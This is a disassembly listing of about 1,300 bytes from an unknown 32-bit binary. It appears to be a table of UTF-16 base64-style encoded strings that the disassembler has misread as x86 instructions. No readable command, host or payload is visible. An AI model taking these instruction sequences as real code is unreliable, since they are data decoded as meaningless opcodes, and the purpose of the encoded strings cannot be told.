  40a3d1:	78 00                	js     0x40a3d3
  40a3d3:	4b                   	dec    %ebx
  40a3d4:	00 51 00             	add    %dl,0x0(%ecx)
  40a3d7:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40a3da:	00 31                	add    %dh,(%ecx)
  40a3dc:	00 4e 00             	add    %cl,0x0(%esi)
  40a3df:	58                   	pop    %eax
  40a3e0:	00 77 00             	add    %dh,0x0(%edi)
  40a3e3:	7a 00                	jp     0x40a3e5
  40a3e5:	69 00 64 00 56 00    	imul   $0x560064,(%eax),%eax
  40a3eb:	63 00                	arpl   %eax,(%eax)
  40a3ed:	62 00                	bound  %eax,(%eax)
  40a3ef:	75 00                	jne    0x40a3f1
  40a3f1:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a3f5:	5a                   	pop    %edx
  40a3f6:	00 4c 00 63          	add    %cl,0x63(%eax,%eax,1)
  40a3fa:	00 69 00             	add    %ch,0x0(%ecx)
  40a3fd:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40a401:	76 00                	jbe    0x40a403
  40a403:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40a407:	46                   	inc    %esi
  40a408:	00 77 00             	add    %dh,0x0(%edi)
  40a40b:	73 00                	jae    0x40a40d
  40a40d:	67 00 65 00          	add    %ah,0x0(%di)
  40a411:	4a                   	dec    %edx
  40a412:	00 37                	add    %dh,(%edi)
  40a414:	00 67 00             	add    %ah,0x0(%edi)
  40a417:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a41c:	92                   	xchg   %eax,%edx
  40a41d:	59                   	pop    %ecx
  40a41e:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  40a422:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a426:	41                   	inc    %ecx
  40a427:	00 47 00             	add    %al,0x0(%edi)
  40a42a:	44                   	inc    %esp
  40a42b:	00 69 00             	add    %ch,0x0(%ecx)
  40a42e:	58                   	pop    %eax
  40a42f:	00 78 00             	add    %bh,0x0(%eax)
  40a432:	7a 00                	jp     0x40a434
  40a434:	34 00                	xor    $0x0,%al
  40a436:	32 00                	xor    (%eax),%al
  40a438:	53                   	push   %ebx
  40a439:	00 55 00             	add    %dl,0x0(%ebp)
  40a43c:	43                   	inc    %ebx
  40a43d:	00 45 00             	add    %al,0x0(%ebp)
  40a440:	4d                   	dec    %ebp
  40a441:	00 75 00             	add    %dh,0x0(%ebp)
  40a444:	51                   	push   %ecx
  40a445:	00 4b 00             	add    %cl,0x0(%ebx)
  40a448:	76 00                	jbe    0x40a44a
  40a44a:	37                   	aaa
  40a44b:	00 48 00             	add    %cl,0x0(%eax)
  40a44e:	48                   	dec    %eax
  40a44f:	00 43 00             	add    %al,0x0(%ebx)
  40a452:	5a                   	pop    %edx
  40a453:	00 35 00 65 00 36    	add    %dh,0x36006500
  40a459:	00 67 00             	add    %ah,0x0(%edi)
  40a45c:	54                   	push   %esp
  40a45d:	00 4e 00             	add    %cl,0x0(%esi)
  40a460:	47                   	inc    %edi
  40a461:	00 33                	add    %dh,(%ebx)
  40a463:	00 78 00             	add    %bh,0x0(%eax)
  40a466:	31 00                	xor    %eax,(%eax)
  40a468:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40a46c:	59                   	pop    %ecx
  40a46d:	00 31                	add    %dh,(%ecx)
  40a46f:	00 78 00             	add    %bh,0x0(%eax)
  40a472:	6c                   	insb   (%dx),%es:(%edi)
  40a473:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40a477:	00 53 00             	add    %dl,0x0(%ebx)
  40a47a:	71 00                	jno    0x40a47c
  40a47c:	4d                   	dec    %ebp
  40a47d:	00 77 00             	add    %dh,0x0(%edi)
  40a480:	62 00                	bound  %eax,(%eax)
  40a482:	48                   	dec    %eax
  40a483:	00 63 00             	add    %ah,0x0(%ebx)
  40a486:	74 00                	je     0x40a488
  40a488:	4c                   	dec    %esp
  40a489:	00 42 00             	add    %al,0x0(%edx)
  40a48c:	45                   	inc    %ebp
  40a48d:	00 71 00             	add    %dh,0x0(%ecx)
  40a490:	2f                   	das
  40a491:	00 70 00             	add    %dh,0x0(%eax)
  40a494:	55                   	push   %ebp
  40a495:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  40a499:	00 35 00 43 00 7a    	add    %dh,0x7a004300
  40a49f:	00 76 00             	add    %dh,0x0(%esi)
  40a4a2:	66 00 35 00 75 00 49 	data16 add %dh,0x49007500
  40a4a9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a4ac:	75 00                	jne    0x40a4ae
  40a4ae:	37                   	aaa
  40a4af:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  40a4b3:	00 49 00             	add    %cl,0x0(%ecx)
  40a4b6:	6d                   	insl   (%dx),%es:(%edi)
  40a4b7:	00 63 00             	add    %ah,0x0(%ebx)
  40a4ba:	7a 00                	jp     0x40a4bc
  40a4bc:	56                   	push   %esi
  40a4bd:	00 7a 00             	add    %bh,0x0(%edx)
  40a4c0:	58                   	pop    %eax
  40a4c1:	00 52 00             	add    %dl,0x0(%edx)
  40a4c4:	7a 00                	jp     0x40a4c6
  40a4c6:	56                   	push   %esi
  40a4c7:	00 5a 00             	add    %bl,0x0(%edx)
  40a4ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4cb:	00 5a 00             	add    %bl,0x0(%edx)
  40a4ce:	50                   	push   %eax
  40a4cf:	00 6e 00             	add    %ch,0x0(%esi)
  40a4d2:	34 00                	xor    $0x0,%al
  40a4d4:	66 00 54 00 35       	data16 add %dl,0x35(%eax,%eax,1)
  40a4d9:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40a4dd:	00 72 00             	add    %dh,0x0(%edx)
  40a4e0:	59                   	pop    %ecx
  40a4e1:	00 6a 00             	add    %ch,0x0(%edx)
  40a4e4:	42                   	inc    %edx
  40a4e5:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40a4e9:	00 2b                	add    %ch,(%ebx)
  40a4eb:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a4ee:	79 00                	jns    0x40a4f0
  40a4f0:	47                   	inc    %edi
  40a4f1:	00 38                	add    %bh,(%eax)
  40a4f3:	00 69 00             	add    %ch,0x0(%ecx)
  40a4f6:	43                   	inc    %ebx
  40a4f7:	00 30                	add    %dh,(%eax)
  40a4f9:	00 58 00             	add    %bl,0x0(%eax)
  40a4fc:	39 00                	cmp    %eax,(%eax)
  40a4fe:	38 00                	cmp    %al,(%eax)
  40a500:	41                   	inc    %ecx
  40a501:	00 31                	add    %dh,(%ecx)
  40a503:	00 43 00             	add    %al,0x0(%ebx)
  40a506:	77 00                	ja     0x40a508
  40a508:	33 00                	xor    (%eax),%eax
  40a50a:	33 00                	xor    (%eax),%eax
  40a50c:	53                   	push   %ebx
  40a50d:	00 73 00             	add    %dh,0x0(%ebx)
  40a510:	49                   	dec    %ecx
  40a511:	00 46 00             	add    %al,0x0(%esi)
  40a514:	57                   	push   %edi
  40a515:	00 50 00             	add    %dl,0x0(%eax)
  40a518:	77 00                	ja     0x40a51a
  40a51a:	70 00                	jo     0x40a51c
  40a51c:	6c                   	insb   (%dx),%es:(%edi)
  40a51d:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40a521:	00 33                	add    %dh,(%ebx)
  40a523:	00 6b 00             	add    %ch,0x0(%ebx)
  40a526:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  40a52a:	61                   	popa
  40a52b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a52e:	4f                   	dec    %edi
  40a52f:	00 2f                	add    %ch,(%edi)
  40a531:	00 69 00             	add    %ch,0x0(%ecx)
  40a534:	50                   	push   %eax
  40a535:	00 2b                	add    %ch,(%ebx)
  40a537:	00 46 00             	add    %al,0x0(%esi)
  40a53a:	4a                   	dec    %edx
  40a53b:	00 42 00             	add    %al,0x0(%edx)
  40a53e:	6a 00                	push   $0x0
  40a540:	6c                   	insb   (%dx),%es:(%edi)
  40a541:	00 44 00 37          	add    %al,0x37(%eax,%eax,1)
  40a545:	00 4f 00             	add    %cl,0x0(%edi)
  40a548:	70 00                	jo     0x40a54a
  40a54a:	6c                   	insb   (%dx),%es:(%edi)
  40a54b:	00 69 00             	add    %ch,0x0(%ecx)
  40a54e:	72 00                	jb     0x40a550
  40a550:	6f                   	outsl  %ds:(%esi),(%dx)
  40a551:	00 35 00 43 00 38    	add    %dh,0x38004300
  40a557:	00 6b 00             	add    %ch,0x0(%ebx)
  40a55a:	30 00                	xor    %al,(%eax)
  40a55c:	56                   	push   %esi
  40a55d:	00 79 00             	add    %bh,0x0(%ecx)
  40a560:	74 00                	je     0x40a562
  40a562:	32 00                	xor    (%eax),%al
  40a564:	75 00                	jne    0x40a566
  40a566:	47                   	inc    %edi
  40a567:	00 4a 00             	add    %cl,0x0(%edx)
  40a56a:	59                   	pop    %ecx
  40a56b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a56e:	47                   	inc    %edi
  40a56f:	00 78 00             	add    %bh,0x0(%eax)
  40a572:	48                   	dec    %eax
  40a573:	00 74 00 37          	add    %dh,0x37(%eax,%eax,1)
  40a577:	00 33                	add    %dh,(%ebx)
  40a579:	00 78 00             	add    %bh,0x0(%eax)
  40a57c:	4b                   	dec    %ebx
  40a57d:	00 62 00             	add    %ah,0x0(%edx)
  40a580:	38 00                	cmp    %al,(%eax)
  40a582:	6a 00                	push   $0x0
  40a584:	77 00                	ja     0x40a586
  40a586:	43                   	inc    %ebx
  40a587:	00 79 00             	add    %bh,0x0(%ecx)
  40a58a:	45                   	inc    %ebp
  40a58b:	00 67 00             	add    %ah,0x0(%edi)
  40a58e:	4c                   	dec    %esp
  40a58f:	00 36                	add    %dh,(%esi)
  40a591:	00 75 00             	add    %dh,0x0(%ebp)
  40a594:	31 00                	xor    %eax,(%eax)
  40a596:	6d                   	insl   (%dx),%es:(%edi)
  40a597:	00 2b                	add    %ch,(%ebx)
  40a599:	00 4e 00             	add    %cl,0x0(%esi)
  40a59c:	76 00                	jbe    0x40a59e
  40a59e:	70 00                	jo     0x40a5a0
  40a5a0:	52                   	push   %edx
  40a5a1:	00 50 00             	add    %dl,0x0(%eax)
  40a5a4:	34 00                	xor    $0x0,%al
  40a5a6:	76 00                	jbe    0x40a5a8
  40a5a8:	2b 00                	sub    (%eax),%eax
  40a5aa:	56                   	push   %esi
  40a5ab:	00 4f 00             	add    %cl,0x0(%edi)
  40a5ae:	69 00 6b 00 68 00    	imul   $0x68006b,(%eax),%eax
  40a5b4:	4e                   	dec    %esi
  40a5b5:	00 70 00             	add    %dh,0x0(%eax)
  40a5b8:	4a                   	dec    %edx
  40a5b9:	00 50 00             	add    %dl,0x0(%eax)
  40a5bc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5bd:	00 46 00             	add    %al,0x0(%esi)
  40a5c0:	4b                   	dec    %ebx
  40a5c1:	00 45 00             	add    %al,0x0(%ebp)
  40a5c4:	6b 00 72             	imul   $0x72,(%eax),%eax
  40a5c7:	00 4a 00             	add    %cl,0x0(%edx)
  40a5ca:	35 00 59 00 62       	xor    $0x62005900,%eax
  40a5cf:	00 4b 00             	add    %cl,0x0(%ebx)
  40a5d2:	69 00 51 00 64 00    	imul   $0x640051,(%eax),%eax
  40a5d8:	47                   	inc    %edi
  40a5d9:	00 52 00             	add    %dl,0x0(%edx)
  40a5dc:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40a5df:	00 48 00             	add    %cl,0x0(%eax)
  40a5e2:	43                   	inc    %ebx
  40a5e3:	00 75 00             	add    %dh,0x0(%ebp)
  40a5e6:	4f                   	dec    %edi
  40a5e7:	00 71 00             	add    %dh,0x0(%ecx)
  40a5ea:	73 00                	jae    0x40a5ec
  40a5ec:	30 00                	xor    %al,(%eax)
  40a5ee:	51                   	push   %ecx
  40a5ef:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40a5f3:	00 57 00             	add    %dl,0x0(%edi)
  40a5f6:	46                   	inc    %esi
  40a5f7:	00 5a 00             	add    %bl,0x0(%edx)
  40a5fa:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5fb:	00 75 00             	add    %dh,0x0(%ebp)
  40a5fe:	43                   	inc    %ebx
  40a5ff:	00 32                	add    %dh,(%edx)
  40a601:	00 43 00             	add    %al,0x0(%ebx)
  40a604:	56                   	push   %esi
  40a605:	00 6e 00             	add    %ch,0x0(%esi)
  40a608:	52                   	push   %edx
  40a609:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40a60d:	00 45 00             	add    %al,0x0(%ebp)
  40a610:	79 00                	jns    0x40a612
  40a612:	74 00                	je     0x40a614
  40a614:	35 00 4b 00 76       	xor    $0x76004b00,%eax
  40a619:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  40a61d:	00 72 00             	add    %dh,0x0(%edx)
  40a620:	37                   	aaa
  40a621:	00 69 00             	add    %ch,0x0(%ecx)
  40a624:	53                   	push   %ebx
  40a625:	00 78 00             	add    %bh,0x0(%eax)
  40a628:	59                   	pop    %ecx
  40a629:	00 49 00             	add    %cl,0x0(%ecx)
  40a62c:	63 00                	arpl   %eax,(%eax)
  40a62e:	2f                   	das
  40a62f:	00 63 00             	add    %ah,0x0(%ebx)
  40a632:	77 00                	ja     0x40a634
  40a634:	6a 00                	push   $0x0
  40a636:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40a63a:	76 00                	jbe    0x40a63c
  40a63c:	32 00                	xor    (%eax),%al
  40a63e:	54                   	push   %esp
  40a63f:	00 30                	add    %dh,(%eax)
  40a641:	00 52 00             	add    %dl,0x0(%edx)
  40a644:	35 00 46 00 65       	xor    $0x65004600,%eax
  40a649:	00 62 00             	add    %ah,0x0(%edx)
  40a64c:	68 00 41 00 47       	push   $0x47004100
  40a651:	00 70 00             	add    %dh,0x0(%eax)
  40a654:	49                   	dec    %ecx
  40a655:	00 4b 00             	add    %cl,0x0(%ebx)
  40a658:	76 00                	jbe    0x40a65a
  40a65a:	51                   	push   %ecx
  40a65b:	00 59 00             	add    %bl,0x0(%ecx)
  40a65e:	4c                   	dec    %esp
  40a65f:	00 35 00 59 00 68    	add    %dh,0x68005900
  40a665:	00 4e 00             	add    %cl,0x0(%esi)
  40a668:	54                   	push   %esp
  40a669:	00 53 00             	add    %dl,0x0(%ebx)
  40a66c:	2b 00                	sub    (%eax),%eax
  40a66e:	34 00                	xor    $0x0,%al
  40a670:	32 00                	xor    (%eax),%al
  40a672:	6c                   	insb   (%dx),%es:(%edi)
  40a673:	00 44 00 39          	add    %al,0x39(%eax,%eax,1)
  40a677:	00 30                	add    %dh,(%eax)
  40a679:	00 2f                	add    %ch,(%edi)
  40a67b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a67e:	77 00                	ja     0x40a680
  40a680:	39 00                	cmp    %eax,(%eax)
  40a682:	79 00                	jns    0x40a684
  40a684:	62 00                	bound  %eax,(%eax)
  40a686:	54                   	push   %esp
  40a687:	00 39                	add    %bh,(%ecx)
  40a689:	00 76 00             	add    %dh,0x0(%esi)
  40a68c:	57                   	push   %edi
  40a68d:	00 75 00             	add    %dh,0x0(%ebp)
  40a690:	57                   	push   %edi
  40a691:	00 33                	add    %dh,(%ebx)
  40a693:	00 4f 00             	add    %cl,0x0(%edi)
  40a696:	59                   	pop    %ecx
  40a697:	00 4a 00             	add    %cl,0x0(%edx)
  40a69a:	61                   	popa
  40a69b:	00 58 00             	add    %bl,0x0(%eax)
  40a69e:	2b 00                	sub    (%eax),%eax
  40a6a0:	32 00                	xor    (%eax),%al
  40a6a2:	31 00                	xor    %eax,(%eax)
  40a6a4:	4a                   	dec    %edx
  40a6a5:	00 59 00             	add    %bl,0x0(%ecx)
  40a6a8:	30 00                	xor    %al,(%eax)
  40a6aa:	70 00                	jo     0x40a6ac
  40a6ac:	4c                   	dec    %esp
  40a6ad:	00 70 00             	add    %dh,0x0(%eax)
  40a6b0:	4b                   	dec    %ebx
  40a6b1:	00 5a 00             	add    %bl,0x0(%edx)
  40a6b4:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40a6b8:	33 00                	xor    (%eax),%eax
  40a6ba:	39 00                	cmp    %eax,(%eax)
  40a6bc:	37                   	aaa
  40a6bd:	00 52 00             	add    %dl,0x0(%edx)
  40a6c0:	51                   	push   %ecx
  40a6c1:	00 69 00             	add    %ch,0x0(%ecx)
  40a6c4:	44                   	inc    %esp
  40a6c5:	00 4a 00             	add    %cl,0x0(%edx)
  40a6c8:	62 00                	bound  %eax,(%eax)
  40a6ca:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6cb:	00 30                	add    %dh,(%eax)
  40a6cd:	00 53 00             	add    %dl,0x0(%ebx)
  40a6d0:	49                   	dec    %ecx
  40a6d1:	00 67 00             	add    %ah,0x0(%edi)
  40a6d4:	74 00                	je     0x40a6d6
  40a6d6:	4e                   	dec    %esi
  40a6d7:	00 65 00             	add    %ah,0x0(%ebp)
  40a6da:	78 00                	js     0x40a6dc
  40a6dc:	59                   	pop    %ecx
  40a6dd:	00 56 00             	add    %dl,0x0(%esi)
  40a6e0:	37                   	aaa
  40a6e1:	00 36                	add    %dh,(%esi)
  40a6e3:	00 68 00             	add    %ch,0x0(%eax)
  40a6e6:	62 00                	bound  %eax,(%eax)
  40a6e8:	61                   	popa
  40a6e9:	00 43 00             	add    %al,0x0(%ebx)
  40a6ec:	59                   	pop    %ecx
  40a6ed:	00 75 00             	add    %dh,0x0(%ebp)
  40a6f0:	54                   	push   %esp
  40a6f1:	00 58 00             	add    %bl,0x0(%eax)
  40a6f4:	46                   	inc    %esi
  40a6f5:	00 79 00             	add    %bh,0x0(%ecx)
  40a6f8:	68 00 33 00 71       	push   $0x71003300
  40a6fd:	00 57 00             	add    %dl,0x0(%edi)
  40a700:	41                   	inc    %ecx
  40a701:	00 78 00             	add    %bh,0x0(%eax)
  40a704:	67 00 33             	add    %dh,(%bp,%di)
  40a707:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40a70b:	00 58 00             	add    %bl,0x0(%eax)
  40a70e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a70f:	00 67 00             	add    %ah,0x0(%edi)
  40a712:	59                   	pop    %ecx
  40a713:	00 67 00             	add    %ah,0x0(%edi)
  40a716:	59                   	pop    %ecx
  40a717:	00 68 00             	add    %ch,0x0(%eax)
  40a71a:	69 00 7a 00 6b 00    	imul   $0x6b007a,(%eax),%eax
  40a720:	39 00                	cmp    %eax,(%eax)
  40a722:	79 00                	jns    0x40a724
  40a724:	72 00                	jb     0x40a726
  40a726:	58                   	pop    %eax
  40a727:	00 56 00             	add    %dl,0x0(%esi)
  40a72a:	35 00 79 00 50       	xor    $0x50007900,%eax
  40a72f:	00 46 00             	add    %al,0x0(%esi)
  40a732:	6e                   	outsb  %ds:(%esi),(%dx)
  40a733:	00 52 00             	add    %dl,0x0(%edx)
  40a736:	72 00                	jb     0x40a738
  40a738:	6a 00                	push   $0x0
  40a73a:	77 00                	ja     0x40a73c
  40a73c:	37                   	aaa
  40a73d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a740:	34 00                	xor    $0x0,%al
  40a742:	61                   	popa
  40a743:	00 58 00             	add    %bl,0x0(%eax)
  40a746:	61                   	popa
  40a747:	00 48 00             	add    %cl,0x0(%eax)
  40a74a:	47                   	inc    %edi
  40a74b:	00 72 00             	add    %dh,0x0(%edx)
  40a74e:	37                   	aaa
  40a74f:	00 6a 00             	add    %ch,0x0(%edx)
  40a752:	6e                   	outsb  %ds:(%esi),(%dx)
  40a753:	00 66 00             	add    %ah,0x0(%esi)
  40a756:	48                   	dec    %eax
  40a757:	00 6b 00             	add    %ch,0x0(%ebx)
  40a75a:	4a                   	dec    %edx
  40a75b:	00 51 00             	add    %dl,0x0(%ecx)
  40a75e:	35 00 53 00 44       	xor    $0x44005300,%eax
  40a763:	00 68 00             	add    %ch,0x0(%eax)
  40a766:	6e                   	outsb  %ds:(%esi),(%dx)
  40a767:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40a76b:	00 67 00             	add    %ah,0x0(%edi)
  40a76e:	51                   	push   %ecx
  40a76f:	00 55 00             	add    %dl,0x0(%ebp)
  40a772:	48                   	dec    %eax
  40a773:	00 4b 00             	add    %cl,0x0(%ebx)
  40a776:	32 00                	xor    (%eax),%al
  40a778:	72 00                	jb     0x40a77a
  40a77a:	79 00                	jns    0x40a77c
  40a77c:	63 00                	arpl   %eax,(%eax)
  40a77e:	49                   	dec    %ecx
  40a77f:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40a783:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  40a787:	00 51 00             	add    %dl,0x0(%ecx)
  40a78a:	41                   	inc    %ecx
  40a78b:	00 39                	add    %bh,(%ecx)
  40a78d:	00 76 00             	add    %dh,0x0(%esi)
  40a790:	72 00                	jb     0x40a792
  40a792:	78 00                	js     0x40a794
  40a794:	6c                   	insb   (%dx),%es:(%edi)
  40a795:	00 55 00             	add    %dl,0x0(%ebp)
  40a798:	54                   	push   %esp
  40a799:	00 32                	add    %dh,(%edx)
  40a79b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a79e:	74 00                	je     0x40a7a0
  40a7a0:	78 00                	js     0x40a7a2
  40a7a2:	47                   	inc    %edi
  40a7a3:	00 67 00             	add    %ah,0x0(%edi)
  40a7a6:	77 00                	ja     0x40a7a8
  40a7a8:	34 00                	xor    $0x0,%al
  40a7aa:	35 00 30 00 7a       	xor    $0x7a003000,%eax
  40a7af:	00 70 00             	add    %dh,0x0(%eax)
  40a7b2:	56                   	push   %esi
  40a7b3:	00 46 00             	add    %al,0x0(%esi)
  40a7b6:	31 00                	xor    %eax,(%eax)
  40a7b8:	4b                   	dec    %ebx
  40a7b9:	00 77 00             	add    %dh,0x0(%edi)
  40a7bc:	4e                   	dec    %esi
  40a7bd:	00 6a 00             	add    %ch,0x0(%edx)
  40a7c0:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40a7c4:	32 00                	xor    (%eax),%al
  40a7c6:	32 00                	xor    (%eax),%al
  40a7c8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7c9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a7cc:	4e                   	dec    %esi
  40a7cd:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40a7d1:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40a7d5:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  40a7d9:	00 30                	add    %dh,(%eax)
  40a7db:	00 6f 00             	add    %ch,0x0(%edi)
  40a7de:	4e                   	dec    %esi
  40a7df:	00 4e 00             	add    %cl,0x0(%esi)
  40a7e2:	2b 00                	sub    (%eax),%eax
  40a7e4:	62 00                	bound  %eax,(%eax)
  40a7e6:	55                   	push   %ebp
  40a7e7:	00 71 00             	add    %dh,0x0(%ecx)
  40a7ea:	67 00 44 00          	add    %al,0x0(%si)
  40a7ee:	62 00                	bound  %eax,(%eax)
  40a7f0:	79 00                	jns    0x40a7f2
  40a7f2:	32 00                	xor    (%eax),%al
  40a7f4:	73 00                	jae    0x40a7f6
  40a7f6:	4c                   	dec    %esp
  40a7f7:	00 32                	add    %dh,(%edx)
  40a7f9:	00 71 00             	add    %dh,0x0(%ecx)
  40a7fc:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40a800:	4c                   	dec    %esp
  40a801:	00 45 00             	add    %al,0x0(%ebp)
  40a804:	6e                   	outsb  %ds:(%esi),(%dx)
  40a805:	00 30                	add    %dh,(%eax)
  40a807:	00 58 00             	add    %bl,0x0(%eax)
  40a80a:	69 00 56 00 4e 00    	imul   $0x4e0056,(%eax),%eax
  40a810:	76 00                	jbe    0x40a812
  40a812:	42                   	inc    %edx
  40a813:	00 39                	add    %bh,(%ecx)
  40a815:	00 51 00             	add    %dl,0x0(%ecx)
  40a818:	61                   	popa
  40a819:	00 61 00             	add    %ah,0x0(%ecx)
  40a81c:	33 00                	xor    (%eax),%eax
  40a81e:	61                   	popa
  40a81f:	00 32                	add    %dh,(%edx)
  40a821:	00 45 00             	add    %al,0x0(%ebp)
  40a824:	30 00                	xor    %al,(%eax)
  40a826:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40a82a:	73 00                	jae    0x40a82c
  40a82c:	56                   	push   %esi
  40a82d:	00 7a 00             	add    %bh,0x0(%edx)
  40a830:	54                   	push   %esp
  40a831:	00 58 00             	add    %bl,0x0(%eax)
  40a834:	78 00                	js     0x40a836
  40a836:	6a 00                	push   $0x0
  40a838:	74 00                	je     0x40a83a
  40a83a:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40a83d:	00 4a 00             	add    %cl,0x0(%edx)
  40a840:	35 00 61 00 79       	xor    $0x79006100,%eax
  40a845:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  40a849:	00 67 00             	add    %ah,0x0(%edi)
  40a84c:	4d                   	dec    %ebp
  40a84d:	00 55 00             	add    %dl,0x0(%ebp)
  40a850:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40a854:	47                   	inc    %edi
  40a855:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
  40a859:	00 52 00             	add    %dl,0x0(%edx)
  40a85c:	58                   	pop    %eax
  40a85d:	00 66 00             	add    %ah,0x0(%esi)
  40a860:	79 00                	jns    0x40a862
  40a862:	34 00                	xor    $0x0,%al
  40a864:	75 00                	jne    0x40a866
  40a866:	56                   	push   %esi
  40a867:	00 2f                	add    %ch,(%edi)
  40a869:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a86c:	33 00                	xor    (%eax),%eax
  40a86e:	50                   	push   %eax
  40a86f:	00 69 00             	add    %ch,0x0(%ecx)
  40a872:	75 00                	jne    0x40a874
  40a874:	63 00                	arpl   %eax,(%eax)
  40a876:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  40a879:	00 43 00             	add    %al,0x0(%ebx)
  40a87c:	62 00                	bound  %eax,(%eax)
  40a87e:	55                   	push   %ebp
  40a87f:	00 52 00             	add    %dl,0x0(%edx)
  40a882:	2f                   	das
  40a883:	00 6f 00             	add    %ch,0x0(%edi)
  40a886:	73 00                	jae    0x40a888
  40a888:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40a88c:	6d                   	insl   (%dx),%es:(%edi)
  40a88d:	00 61 00             	add    %ah,0x0(%ecx)
  40a890:	77 00                	ja     0x40a892
  40a892:	50                   	push   %eax
  40a893:	00 70 00             	add    %dh,0x0(%eax)
  40a896:	36 00 6c 00 4e       	add    %ch,%ss:0x4e(%eax,%eax,1)
  40a89b:	00 58 00             	add    %bl,0x0(%eax)
  40a89e:	51                   	push   %ecx
  40a89f:	00 38                	add    %bh,(%eax)
  40a8a1:	00 32                	add    %dh,(%edx)
  40a8a3:	00 70 00             	add    %dh,0x0(%eax)
  40a8a6:	76 00                	jbe    0x40a8a8
  40a8a8:	42                   	inc    %edx
  40a8a9:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40a8ad:	00 43 00             	add    %al,0x0(%ebx)
  40a8b0:	58                   	pop    %eax
  40a8b1:	00 30                	add    %dh,(%eax)
  40a8b3:	00 4b 00             	add    %cl,0x0(%ebx)
  40a8b6:	43                   	inc    %ebx
  40a8b7:	00 73 00             	add    %dh,0x0(%ebx)
  40a8ba:	67 00 4f 00          	add    %cl,0x0(%bx)
  40a8be:	34 00                	xor    $0x0,%al
  40a8c0:	37                   	aaa
  40a8c1:	00 56 00             	add    %dl,0x0(%esi)
  40a8c4:	32 00                	xor    (%eax),%al
  40a8c6:	73 00                	jae    0x40a8c8
  40a8c8:	37                   	aaa
  40a8c9:	00 79 00             	add    %bh,0x0(%ecx)
  40a8cc:	5a                   	pop    %edx
  40a8cd:	00 77 00             	add    %dh,0x0(%edi)
  40a8d0:	73 00                	jae    0x40a8d2
  40a8d2:	46                   	inc    %esi
  40a8d3:	00 73 00             	add    %dh,0x0(%ebx)
  40a8d6:	51                   	push   %ecx
  40a8d7:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40a8db:	00 77 00             	add    %dh,0x0(%edi)
  40a8de:	56                   	push   %esi
  40a8df:	00 52 00             	add    %dl,0x0(%edx)
  40a8e2:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  40a8e6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8e7:	00 70 00             	add    %dh,0x0(%eax)
  40a8ea:	41                   	inc    %ecx
  40a8eb:	00 67 00             	add    %ah,0x0(%edi)
  40a8ee:	48                   	dec    %eax
  40a8ef:	00 31                	add    %dh,(%ecx)
  40a8f1:	00 76 00             	add    %dh,0x0(%esi)
  40a8f4:	4e                   	dec    %esi
  40a8f5:	00 66 00             	add    %ah,0x0(%esi)
  40a8f8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8f9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8fc:	54                   	push   %esp
  40a8fd:	00 38                	add    %bh,(%eax)
  40a8ff:	00 41 00             	add    %al,0x0(%ecx)
  40a902:	33 00                	xor    (%eax),%eax
  40a904:	67 00 4f 00          	add    %cl,0x0(%bx)
  40a908:	70 00                	jo     0x40a90a
  40a90a:	71 00                	jno    0x40a90c
  40a90c:	6b 00 75             	imul   $0x75,(%eax),%eax
  40a90f:	00 59 00             	add    %bl,0x0(%ecx)
  40a912:	6e                   	outsb  %ds:(%esi),(%dx)
  40a913:	00 69 00             	add    %ch,0x0(%ecx)
  40a916:	39 00                	cmp    %eax,(%eax)
  40a918:	62 00                	bound  %eax,(%eax)
  40a91a:	45                   	inc    %ebp
